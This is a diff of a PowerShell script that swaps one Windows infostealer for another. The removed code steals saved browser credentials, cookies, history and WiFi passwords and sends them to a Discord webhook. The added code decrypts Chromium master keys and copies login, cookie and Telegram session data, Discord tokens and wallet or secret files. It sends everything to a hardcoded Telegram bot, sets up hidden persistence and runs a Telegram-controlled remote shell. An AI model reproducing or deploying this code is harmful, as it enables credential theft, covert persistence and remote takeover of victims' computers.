@@ -1,508 +1,165 @@
-function BadFriend {
-    $remoteDebuggingPort = 9222 # port where debug mode will be opened
-    $URL = "https://www.google.com" # you can set any value you want, the result will not change
+$a = "AAH_rTUBDLAtFbjomRxeds-dXAuIv3nKbtI"
+$b = "7536224035:"
+$t = $b + $a
+$c = "7048394156"
+$g = "https://api.telegram.org/bot$t"
 
-    $hookUrl = "https://discord.com/api/webhooks/1473303155495276636/P21PvzuQgc5ueDQYKqdcfIwV4ZCDfmtwMvsqJEmw9iqOXBPukH5xiU1TrXklGA7r9sSj"
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.Web
 
-
-    dumpChromium "chrome" "\Google\Chrome\User Data"
-
-    dumpChromium "opera" "\Opera Software\Opera Stable"
-
-    dumpChromium "msedge" "\Microsoft\Edge\User Data"
-
-    dumpChromium "brave" "\BraveSoftware\Brave-Browser\User Data"
-
-    dumpCookies("chrome.exe")
-    dumpCookies("opera.exe")
-    dumpCookies("msedge.exe")
-    dumpCookies("brave.exe")
-    HistoryLover
-    
-}
-
-function Get-WiFiPasswords {
-
-    sendMessage("Dumping WiFi passwords")
-    $profilesOutput = netsh wlan show profiles
-
-    if ($profilesOutput -match "There is no wireless interface on the system" -or !$profilesOutput) {
-        sendMessage("No wireless interfaces found.")
-        return
-    }
-
-    $ex = ".tmp"
-    $tempPath = $Env:TEMP
-    $fileOut = generateFileName
-    $fileOut = $fileOut + $ex
-    $fullPath = $tempPath + "\" + $fileOut
-    $WiFiPasswords = @{}
-
-    ($profilesOutput | Select-String -Pattern "\:(.+)$") | ForEach-Object {
-        $Name = $_.Matches.Groups[1].Value.Trim()
-
-        $profileDetails = netsh wlan show profile name="$Name" key=clear
-        $keyLine = $profileDetails | Select-String -Pattern "Key Content\W+\:(.+)$"
-
-        if ($keyLine) {
-            $Pass = $keyLine.Matches.Groups[1].Value.Trim()
-        }
-        else {
-            $Pass = "[No Password Found]"
-        }
-
-        $WiFiPasswords[$Name] = $Pass
-    }
+function Send-Exfil {
+    param([string]$m, [string]$f)
     try {
-        $WiFiPasswords | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
-    }
-    catch {
-        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-        sendMessage($message)
-    }
-
-    discordExfiltration -fileOut $fullPath
-    removeFile -path $fullPath
-
-}
-
-function quitx($browser) {
-    $browser = [io.path]::GetFileNameWithoutExtension($browser)
-    if (Get-Process -Name $browser -ErrorAction SilentlyContinue) {
-        Stop-Process -Name $browser -Force
-    }
-}
-# credits for this function: https://github.com/ScRiPt1337/PowerCookieMonster/blob/main/powerdump.ps1
-function SendReceiveWebSocketMessage {
-    param (
-        [string] $WebSocketUrl,
-        [string] $Message
-    )
-
-    try {
-        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
-        $CancellationToken = [System.Threading.CancellationToken]::None
-        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
-        [void]$connectTask.Result
-        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
-            throw "WebSocket connection failed. State: $($WebSocket.State)"
+        if ($m) { 
+            $o = @{chat_id=$c; text=$m; parse_mode="Markdown"}
+            Invoke-RestMethod -Uri "$g/sendMessage" -Method Post -Body ($o | ConvertTo-Json) -ContentType "application/json"
         }
-        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
-        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
-        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
-        [void]$sendTask.Result
-        $receivedData = New-Object System.Collections.Generic.List[byte]
-        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
-        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)
+        if ($f -and (Test-Path $f)) {
+            curl.exe -X POST "$g/sendDocument" -F "chat_id=$c" -F "document=@$f"
+        }
+    } catch {}
+}
 
-        while ($true) {
-            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
-            if ($receiveResult.Result.Count -gt 0) {
-                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
+function Get-MasterKey {
+    param($lp)
+    if (Test-Path $lp) {
+        $j = Get-Content $lp | ConvertFrom-Json
+        $k = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
+        $k = $k[5..$k.Length-1]
+        return [System.Security.Cryptography.ProtectedData]::Unprotect($k, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    }
+}
+
+function Get-DetailedSys {
+    $i = "--- FULL SYSTEM REPORT ---`n"
+    $i += "Computer: $env:COMPUTERNAME`n"
+    $i += "User: $env:USERNAME`n"
+    $i += "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
+    $i += "CPU: $((Get-WmiObject Win32_Processor).Name)`n"
+    $i += "RAM: $((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB) GB`n"
+    $i += "Public IP: $(Invoke-RestMethod ipinfo.io/ip)`n"
+    $i += "Local IP: $((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ', ')`n"
+    $w = "`n--- WIFI NETWORKS ---`n"
+    $p = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+    foreach ($n in $p) {
+        $v = netsh wlan show profile name="$n" key=clear | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+        $w += "SSID: $n | Pass: $v`n"
+    }
+    return $i + $w
+}
+
+function Deep-Search {
+    $found = New-Object System.Collections.Generic.List[string]
+    $drive = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.DriveType -eq 'Fixed' }
+    $exts = @("*.jpg", "*.png", "*.pdf", "*.txt", "*.docx", "*.xlsx", "*.ppk", "*.key", "*.wallet")
+    foreach ($d in $drive) {
+        $root = $d.RootDirectory.FullName
+        Get-ChildItem -Path "$root\Users\$env:USERNAME" -Include $exts -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_.Name -match "pass|wallet|secret|seed|bank|crypto|login|id|card|auth|token") {
+                if ($_.Length -lt 7MB) { $found.Add($_.FullName) }
             }
-            if ($receiveResult.Result.EndOfMessage) {
-                break
+            elseif ($_.Extension -match "jpg|png" -and $_.LastWriteTime -gt (Get-Date).AddDays(-60)) {
+                if ($_.Length -lt 5MB) { $found.Add($_.FullName) }
             }
         }
-        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
-        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
-        return $ReceivedMessage
     }
-    catch {
-        throw $_
-    }
+    return $found
 }
 
-Function generateFileName {
-    # Generate a random string using characters from the specified ranges
-    $fileName = -join ((48..57) + (65..90) + (97..122) | ForEach-Object { [char]$_ } | Get-Random -Count 5)
-    return $fileName
-}
-
-function dumpCookies($browser) {
-    # opera.exe, chrome.exe, ecc....
-    $ex = ".tmp"
-    $tempPath = $Env:TEMP
-    quitx($browser)
-    try {        
-        $process = Start-Process $browser -ArgumentList $URL  , "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort" # cookies don't get loeaded in headless mode, anyone know how to resolve this?
-    }
-    catch {
-        $browserM = [io.path]::GetFileNameWithoutExtension($browser)
-        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserM)
-        $message = "The browser $browserM has not been found in the system (or maybe you have specified the wrong executable)"
-        sendMessage($message)
-        return $null
-    }
-    $fileOut = generateFileName
-    $fileOut = $fileOut + $ex
-    $fullPath = $tempPath + "\" + $fileOut
-    $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
+function Set-Persistence {
     try {
-        $jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
-    }
-    catch {
-        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)`n(It means he didn't found the cookies for a specified Browser, probably it's not installed)"
-        sendMessage($message)
-    }    
-    $url_capture = $jsonData.webSocketDebuggerUrl
-    $Message = '{"id": 1,"method":"Network.getAllCookies"}'
-	
-    if ($url_capture -and $url_capture.Count -gt 0 -and $url_capture[0].Length -ge 2) {
-        $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message 
-        # Write to results.txt
-        
-        $response = $response -replace '^[^{]*', ''
+        $p = "$env:APPDATA\Microsoft\Windows\WinHostSvc.ps1"
+        $m = $MyInvocation.MyCommand.Definition
+        if ($m) { Copy-Item $m $p -Force }
+        $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty -Path $key -Name "WindowsHostProvider" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
+        $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
+        $trig = New-ScheduledTaskTrigger -AtLogOn
+        Register-ScheduledTask -TaskName "WinSvcUpdate" -Action $act -Trigger $trig -Force | Out-Null
+    } catch {}
+}
 
-        $response = $response -split "`n" | Where-Object { $_.Trim() -ne "" } | Out-String
-        $json = $response | ConvertFrom-Json
-        $json = sortCookies($json.result.cookies)
+function Remote-Shell {
+    $l = 0
+    while($true) {
         try {
-            $json | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
-        }
-        catch {
-            $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-            sendMessage($message)
-        }
-        $browserM = [io.path]::GetFileNameWithoutExtension($browser)
-        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserM)
-        $message = "Cookies from $browserM :"
-        sendMessage($message)
-        discordExfiltration -json $json -fileOut $fullPath # I had to call the function like this...otherwise it was not working (I mean discordExfiltration($json, $fileOut))
-        # If there is any powershell expert out there that gonna help me with this issue I will be grateful (talk with me on Discord!)
-      
-        removeFile($fullPath)
-        quitx($browser)
-    
-    } 
-
-}
-
-
-function sortCookies {
-    param (
-        $cookies
-    )
-
-    return $cookies | Sort-Object { $_.domain }
-    
-}
-
-
-function HistoryLover {
-
-    $ex = ".tmp"
-    $tempPath = $Env:TEMP
-    $fileOut = generateFileName
-    $fileOut = $fileOut + $ex
-    $fileOut = $tempPath + "\" + $fileOut
-    $UserName = $Env:UserName
-
-    # Define the paths for each browser's History file
-    $Browsers = @{
-        "Chrome" = "$Env:LocalAppData\Google\Chrome\User Data\Default\History"
-        "Edge"   = "$Env:LocalAppData\Microsoft\Edge\User Data\Default\History"
-        "Opera"  = "$Env:AppData\Opera Software\Opera Stable\Default\History"
-        "Brave"  = "$Env:LocalAppData\BraveSoftware\Brave-Browser\User Data\Default\History"
-    } # ADD OTHERS
-    
-    # Regular expression to extract full URLs
-    $Regex = '(https?:\/\/[^\s"]+)'
-    
-    # Loop through each browser and extract history
-
-    $records = @{}
-
-    foreach ($Browser in $Browsers.Keys) {
-        $Path = $Browsers[$Browser]
-        quitx($Browser)
-        Start-Sleep -s 0.5
-        # Check if the History file exists
-        if (Test-Path -Path $Path) {
-           
-            if ($Browser -eq "Edge") {
-                # Because Edge is locked because is used by some Windows process, the easiest way to bypass this is copy the content into another file 
-                Get-Content $Path > $fileOut
-                $Path = $fileOut
-            }
-            try {
-                $RawData = [System.IO.File]::ReadAllText($Path) -join " "
-    
-                $Matches = [regex]::Matches($RawData, $Regex) | ForEach-Object { $_.Value } | Sort-Object -Unique
-                $records.Add($Browser, $Matches)
-                if ($Browser -eq "Edge") {
-                    #removeFile -path $Path
-                }
-            }
-            catch {
-                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-                sendMessage($message)
-            }
-            
-
-        }
-        else {
-            sendMessage("Could not find history file for $Browser.")
-        }
-    }
-    $records | ConvertTo-Json -Depth 10 | Out-File -FilePath $fileOut -Force
-    sendMessage("Start of Browsers History dumping:")
-
-
-    $compressedFile = compress -path $fileOut # History files can be a lot big, compression is a must
-
-    $result = discordExfiltration -fileOut $compressedFile
-
-    
-    removeFile -path $compressedFile
-    removeFile -path $fileOut
-    sendMessage("End of Browsers History dumping")
-
-}
-
-
-
-function compress {
-    param (
-        $path
-    )
-    $tempPath = $Env:TEMP
-    $fileName = generateFileName
-    $compressedFile = $tempPath + "\" + $fileName + ".tar.xz"
-    try {
-        $tarCommand = "tar.exe -cvJf '$compressedFile' '$path'"
-        Invoke-Expression $tarCommand *> $null
-    } 
-    catch {
-        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-        sendMessage($message)
-    }
-    
-
-    return $compressedFile
-}
-
-function quitx($browser) {
-    $browser = [io.path]::GetFileNameWithoutExtension($browser)
-    $browser = $browser.ToLower()
-    if (Get-Process -Name $browser -ErrorAction SilentlyContinue) {
-        Stop-Process -Name $browser -Force
-    }
-}
-
-function discordExfiltration {
-    param(
-        $fileOut
-    )
-    try {
-        # Path to your JSON file
-        $jsonFilePath = $fileOut
-            
-            
-        # Ensure the file exists before sending it
-        if (Test-Path $jsonFilePath) {
-            $fileSize = Get-ItemProperty -Path $fileOut | Select-Object -ExpandProperty Length
-
-            if ($fileSize -gt 10000000) {
-                return $fileOut
-            }
-            try {
-                $curlCommand = "curl.exe -w '%{http_code}' -s -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data' | Out-Null"
-                Invoke-Expression $curlCommand
-    
-            }
-            catch {
-                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-                sendMessage($message)
-            }
-    
-                
-        }
-        else {
-            $message = "The JSON file was not found. Please check the file path."
-            sendMessage($message)
-        }
-    }
-    catch {
-        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-        sendMessage($message)
-    }
-        
-}
-
-
-
-
-# class to interact with SQLite databases using
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class WinSQLite3
-{
-    const string dll = "winsqlite3";
-    [DllImport(dll, EntryPoint="sqlite3_open")]
-    public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
-    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
-    public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
-    [DllImport(dll, EntryPoint="sqlite3_step")]
-    public static extern IntPtr Step(IntPtr stmt);
-    [DllImport(dll, EntryPoint="sqlite3_column_text16")]
-    static extern IntPtr ColumnText16(IntPtr stmt, int index);
-    [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
-    static extern int ColumnBytes(IntPtr stmt, int index);
-    [DllImport(dll, EntryPoint="sqlite3_column_blob")]
-    static extern IntPtr ColumnBlob(IntPtr stmt, int index);
-    public static string ColumnString(IntPtr stmt, int index)
-    { 
-        return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
-    }
-    public static byte[] ColumnByteArray(IntPtr stmt, int index)
-    {
-        int length = ColumnBytes(stmt, index);
-        byte[] result = new byte[length];
-        if (length > 0)
-            Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
-        return result;
-    }
-    [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
-    public static extern IntPtr Errmsg(IntPtr db);
-    public static string GetErrmsg(IntPtr db)
-    {
-        return Marshal.PtrToStringUni(Errmsg(db));
-    }
-}
-"@
-
-
-function dumpChromium($browserName, $userDataPath) {
-        
-    # browserName = chrome, opera, name of process
-    #pathName = \Google\Chrome\User Data, \Opera Software\Opera Stable
-    $ErrorActionPreference = 'SilentlyContinue'
-    try {
-        Stop-Process -Name $browserName
-        Add-Type -AssemblyName System.Security
-
-        if ($browserName -eq "opera") {
-            $browser_path = $env:APPDATA + $userDataPath
-        }
-        else {
-            $browser_path = $env:LOCALAPPDATA + $userDataPath
-        }
-        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
-
-        $secret = Get-Content -Raw -Path $( -join ($browser_path, "\Local State")) | ConvertFrom-Json
-        $secretkey = $secret.os_crypt.encrypted_key
-
-        $cipher = [Convert]::FromBase64String($secretkey)
-
-        $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
-
-
-
-        $browser_profiles = Get-ChildItem -Path $browser_path | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | % { $_.FullName }
-
-
-        $ex = ".tmp"
-        $tempPath = $Env:TEMP
-        $fileOut = generateFileName
-        $fileOut = $fileOut + $ex
-        $fullPath = $tempPath + "\" + $fileOut
-        $records = @{}
-        $i = 0
-        foreach ($user_profile in $browser_profiles) {
-            $dbH = 0
-            if ([WinSQLite3]::Open($( -join ($user_profile, "\Login Data")), [ref] $dbH) -ne 0) {
-                sendMessage("Failed to open!")
-                [WinSQLite3]::GetErrmsg($dbh)
-                
-            }
-
-            $stmt = 0
-            if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
-                sendMessage("Failed to prepare!")
-                [WinSQLite3]::GetErrmsg($dbh)
-               
-            }
-
-            while ([WinSQLite3]::Step($stmt) -eq 100) {
-                
-                try {
-                    $url = [WinSQLite3]::ColumnString($stmt, 0)
-                    $username = [WinSQLite3]::ColumnString($stmt, 1)
-                    $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))
-
-                    # Store the extracted data in a structured object
-                    $record = @{
-                        url      = $url
-                        username = $username
-                        password = $encryptedPassword
-                        key      = $key
+            $r = Invoke-RestMethod -Uri "$g/getUpdates?offset=$($l + 1)"
+            foreach($u in $r.result) {
+                $l = $u.update_id
+                $d = $u.message.text
+                if ($u.message.chat.id -eq $c) {
+                    if ($d -eq "screenshot") {
+                        $f = "$env:TEMP\s.png"
+                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+                        $b = New-Object Drawing.Bitmap ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+                        $g_img = [Drawing.Graphics]::FromImage($b)
+                        $g_img.CopyFromScreen(0, 0, 0, 0, $b.Size)
+                        $b.Save($f, [Drawing.Imaging.ImageFormat]::Png)
+                        Send-Exfil -f $f
+                        Remove-Item $f
+                    } else {
+                        $res = Invoke-Expression $d | Out-String
+                        Send-Exfil -m "Output:`n$res"
                     }
-                    $i++
-                    # Add record to the list
-                    $jsonRecord = $record | ConvertTo-Json -Depth 10
-                    $records.Add($i.ToString(), $jsonRecord)
                 }
-                catch {
-                    sendMessage($_.Exception.Message)
-                }
-
-                
             }
- 
-        
-
-        }
-
-        try {
-            $records | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
-        }
-        catch {
-            $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
-            sendMessage($message)
-        }
-        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserName)
-        $message = "Credentials from $browserM :"
-        sendMessage($message)
-        discordExfiltration -fileOut $fullPath
-        removeFile -path $fullPath
-
-
+        } catch {}
+        Start-Sleep -Seconds 5
     }
-    catch [Exception] {
-        sendMessage($_.Exception.Message)
-    }
-
-
 }
 
-function sendMessage {
-    param(
-        $message
-    )
-    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
-    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
-}
-
-function removeFile {
-    param(
-        $path
-    )
-    if (Test-Path $path) {
+function Start-FullInfection {
+    Set-Persistence
+    $wd = New-Item -ItemType Directory -Path "$env:TEMP\$(Get-Random)" -Force
+    Get-DetailedSys | Out-File "$wd\System_Log.txt"
     
-        Remove-Item -Path "$path" -Force
-        $message = "File at $path deleted;)"
-        sendMessage($message)
+    $br = @{
+        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
+        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
+        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";
+        "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
+    }
     
+    foreach($k in $br.Keys) {
+        $p = $br[$k]
+        if (Test-Path "$p\Local State") {
+            $mk = Get-MasterKey "$p\Local State"
+            if ($mk) { [System.IO.File]::WriteAllBytes("$wd\$k_Master.key", $mk) }
+            $paths = @("\Default\Login Data", "\Default\Web Data", "\Default\Network\Cookies")
+            foreach($pth in $paths) {
+                if (Test-Path "$p$pth") {
+                    $fn = $k + $pth.Replace("\", "_") + ".db"
+                    Copy-Item "$p$pth" "$wd\$fn" -Force
+                }
+            }
+        }
     }
-    else {
-        $message = "I was not able to remove the file at $path....What happened?"
-        sendMessage($message)
+
+    $tg = "$env:APPDATA\Telegram Desktop\tdata"
+    if (Test-Path $tg) {
+        $z_tg = "$wd\TG_Session.zip"
+        Compress-Archive -Path "$tg\D877F783D5D3EF8C*", "$tg\map*" -DestinationPath $z_tg -Force
     }
-        
+    
+    $ds = "$env:APPDATA\discord\Local Storage\leveldb"
+    if (Test-Path $ds) {
+        Get-ChildItem $ds -Filter "*.ldb" | Select-String -Pattern "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" | Out-File "$wd\DS_Tokens.txt"
+    }
+
+    $assets = Deep-Search
+    foreach($file in $assets) {
+        $dest = Join-Path $wd ([System.IO.Path]::GetFileName($file))
+        Copy-Item $file -Destination $dest -ErrorAction SilentlyContinue
+    }
+
+    $final_z = "$env:TEMP\Final_Vault_$env:USERNAME.zip"
+    Compress-Archive -Path "$($wd.FullName)\*" -DestinationPath $final_z -Force
+    Send-Exfil -m "🔴 *Target Infiltrated*`nUser: $env:USERNAME`nAssets: $($assets.Count)`nStatus: Silent & Persistent"
+    Send-Exfil -f $final_z
+    
+    Remove-Item $wd -Recurse -Force
+    Remove-Item $final_z -Force
+    Remote-Shell
 }
 
-
-
-BadFriend | Out-Null
+Start-FullInfection
